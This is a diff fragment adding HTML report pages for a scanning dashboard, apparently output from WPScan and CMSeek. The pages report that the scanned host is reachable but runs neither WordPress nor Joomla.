+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+
+
+<main>
+
+  <div class="my-3 p-3 bg-body rounded shadow-sm">
+    <h6 class="border-bottom pb-2 mb-0">WPScan - WordPress Vulnerability Scanner</h6>
+    <a href="#WPScan"></a>
+    <p></p>
+
+    <h6 class="border-bottom pb-2 mb-0">Gathered Information</h6>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
+        class="bd-placeholder-img flex-shrink-0 me-2 bi bi-info-circle" viewBox="0 0 16 16">
+        <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+        <path
+          d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+      </svg>
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">It seems that host is
+            reachable but it isn't running WordPress as CMS
+          </strong>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+</main>
+
+
+<script src="/static/js/bootstrap.bundle.min.js"></script>
+
+<script src="https://unpkg.com/feather-icons"></script>
+</script>
+<script src="/static/js/dashboard.js"></script>
+
+</html>
+    
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Report</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+
+
+<main>
+  
+    <div class="my-3 p-3 bg-body rounded shadow-sm">
+      <h6 class="border-bottom pb-2 mb-0">CMSeek - CMS Scanner (Joomla)</h6>
+
+      <p></p>
+      <h6 class="border-bottom pb-2 mb-0">Gathered information</h6>
+      <div class="d-flex text-muted pt-3">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
+          class="bd-placeholder-img flex-shrink-0 me-2 bi bi-info-circle" viewBox="0 0 16 16">
+          <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+          <path
+            d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+        </svg>
+        <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+          <div class="d-flex justify-content-between">
+            <strong class="text-gray-dark">It seems that host is
+              reachable but it isn't running Joomla as CMS</strong>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    
+</main>
+
+
+<script src="/static/js/bootstrap.bundle.min.js"></script>
+
+<script src="https://unpkg.com/feather-icons"></script>
+</script>
+<script src="/static/js/dashboard.js"></script>
+
+</html>
+  </main>
+
+
+  <script src="/static/js/bootstrap.bundle.min.js"></script>
+
+  <script src="https://unpkg.com/feather-icons"></script>
+  </script>
+  <script src="/static/js/dashboard.js"></script>
+</body>
+
+</html>
